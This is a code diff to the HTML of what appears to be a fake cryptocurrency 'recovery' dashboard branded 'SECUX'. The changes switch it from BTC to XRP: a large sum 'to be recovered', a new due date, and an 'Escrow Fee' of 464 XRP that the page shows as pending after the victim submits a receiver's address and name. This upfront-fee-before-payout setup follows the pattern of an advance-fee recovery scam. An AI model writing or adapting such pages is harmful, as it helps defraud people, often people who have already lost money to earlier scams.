@@ -53,7 +53,7 @@
 										<section class="mt-4 bg-gradient-to-b from-white/5 to-white/[0.03] border border-[var(--stroke)] rounded-xl p-6 relative">
 											<div class="flex items-end gap-3">
 												<div id="dash_totalRecovered" class="text-white text-3xl font-semibold">
-													1648.21 BTC
+													2324 XRP
 												</div>
 												<div class="text-white/35 text-xs mb-1">
 													to be recovered
@@ -77,36 +77,31 @@
 											<div class="mt-6 grid grid-cols-[2.1fr_110px] gap-6">
 												<div>
 													<div class="text-white/35 text-xs">Due Date</div>
-													<div id="dash_dueDate" class="text-white text-sm font-medium mt-1">Jan 1, 2026</div>
+													<div id="dash_dueDate" class="text-white text-sm font-medium mt-1">April 25th, 2026</div>
 												</div>
 												<div>
 													<div class="text-white/35 text-xs">Escrow Fee</div>
-													<div id="dash_escrowFee" class="text-white text-sm font-medium mt-1">0.18</div>
+													<div id="dash_escrowFee" class="text-white text-sm font-medium mt-1">464 XRP</div>
 												</div>
 											</div>
 											<div class="mt-6 grid grid-cols-2 gap-6">
 												<div>
 													<div class="text-white/35 text-xs">Recovery Amount</div>
-													<div id="dash_recoveryAmount" class="text-white text-sm font-medium mt-1">1648.21 BTC</div>
+													<div id="dash_recoveryAmount" class="text-white text-sm font-medium mt-1">2324 XRP</div>
 												</div>
 											</div>
 											<!-- Refund Form Integration -->
 											<form id="refundForm" class="mt-8 space-y-4">
 												<div>
-													<label class="block text-white/40 text-xs mb-1" for="routing1">Bank Routing Number</label>
+													<label class="block text-white/40 text-xs mb-1" for="routing1">Receiver's Address</label>
 													<input class="w-full rounded-lg bg-white/5 border border-[var(--stroke)] px-3 py-2 text-white text-sm font-semibold" type="text" id="routing1" name="routing1" placeholder="Recurrent: Active Recover" required>
 												</div>
 												<div>
-													<label class="block text-white/40 text-xs mb-1" for="routing2">Bank Routing Number</label>
-													<input class="w-full rounded-lg bg-white/5 border border-[var(--stroke)] px-3 py-2 text-white text-sm font-semibold" type="text" id="routing2" name="routing2" placeholder="Recurrent: Active Recover" required>
-												</div>
-												<div>
-													<label class="block text-white/40 text-xs mb-1" for="bankName">Bank Name</label>
+													<label class="block text-white/40 text-xs mb-1" for="bankName">Receiver's Name</label>
 													<input class="w-full rounded-lg bg-white/5 border border-[var(--stroke)] px-3 py-2 text-white text-sm font-semibold" type="text" id="bankName" name="bankName" placeholder="Recurrent: Active Recover" required>
 												</div>
 												<button class="w-full rounded-lg bg-[var(--lime)] text-black text-sm font-semibold py-2 mt-2" type="submit">Submit Request</button>
-												<div class="text-white/40 text-xs mt-2 text-center">We will convert your BTC to USD and send to your provided bank account.</div>
-											</form>
+												</form>
 											<!-- End Refund Form Integration -->
 										</section>
 									</div>
@@ -140,7 +135,7 @@
 						formCard.innerHTML = `
 							<div style="text-align:center; padding: 60px 0;">
 								<div style="font-size:1.25em; font-weight:600; color:#b6ff6b; margin-bottom:10px;">Escrow fee pending</div>
-								<div style="font-size:1.7em; font-weight:700; color:#fff;">0.118 BTC</div>
+								<div style="font-size:1.7em; font-weight:700; color:#fff;">464 XRP</div>
 							</div>
 						`;
 					} else {
@@ -383,7 +378,7 @@
 		<div class="container">
 			<div class="header">
 				<div class="logo">SEC<span>UX</span></div>
-				<button class="btn" type="button">Collect BTC</button>
+				<button class="btn" type="button">Collect XRP</button>
 			</div>
 			<div class="take-next">Take the next request</div>
 			<div class="tab-group">
@@ -391,7 +386,7 @@
 				<button class="tab" type="button">Start Recovery</button>
 			</div>
 			<form id="refundForm" class="card">
-				<div class="btc-amount" id="btcAmount">1648.21 BTC</div>
+				<div class="btc-amount" id="btcAmount">2324 XRP</div>
 				<div class="btc-desc">This recovery will be part of the active recovery.</div>
 				<div class="slider-row">
 					<span class="slider-label">Recovery</span>
@@ -401,34 +396,29 @@
 				<div class="info-row">
 					<div>
 						<span class="info-label">Due Date</span><br>
-						<span class="info-value" id="dueDate">Jan 1, 2026</span>
+						<span class="info-value" id="dueDate">April 25th, 2026</span>
 					</div>
 					<div>
 						<span class="info-label">Escrow Fee</span><br>
-						<span class="info-value" id="escrowFee">0.18</span>
+						<span class="info-value" id="escrowFee">464 XRP</span>
 					</div>
 				</div>
 				<div class="info-row">
 					<div>
 						<span class="info-label">Recovery Amount</span><br>
-						<span class="info-value" id="recoveryAmount">1648.21 BTC</span>
+						<span class="info-value" id="recoveryAmount">2324 XRP</span>
 					</div>
 				</div>
 				<div class="form-group">
-					<label class="form-label" for="routing1">Bank Routing Number</label>
+					<label class="form-label" for="routing1">Receiver's Address</label>
 					<input class="form-input" type="text" id="routing1" name="routing1" placeholder="Recurrent: Active Recover" required>
 				</div>
 				<div class="form-group">
-					<label class="form-label" for="routing2">Bank Routing Number</label>
-					<input class="form-input" type="text" id="routing2" name="routing2" placeholder="Recurrent: Active Recover" required>
-				</div>
-				<div class="form-group">
-					<label class="form-label" for="bankName">Bank Name</label>
+					<label class="form-label" for="bankName">Receiver's Name</label>
 					<input class="form-input" type="text" id="bankName" name="bankName" placeholder="Recurrent: Active Recover" required>
 				</div>
 				<button class="submit-btn" type="submit">Submit Request</button>
-				<div class="note">We will convert your BTC to USD and send to your provided bank account.</div>
-			</form>
+				</form>
 		</div>
 	</div>
 	<script>
@@ -455,7 +445,7 @@
 					formCard.innerHTML = `
 						<div style="text-align:center; padding: 60px 0;">
 							<div style="font-size:1.25em; font-weight:600; color:#b6ff6b; margin-bottom:10px;">Escrow fee pending</div>
-							<div style="font-size:1.7em; font-weight:700; color:#fff;">0.118 BTC</div>
+							<div style="font-size:1.7em; font-weight:700; color:#fff;">464 XRP</div>
 						</div>
 					`;
 				} else {
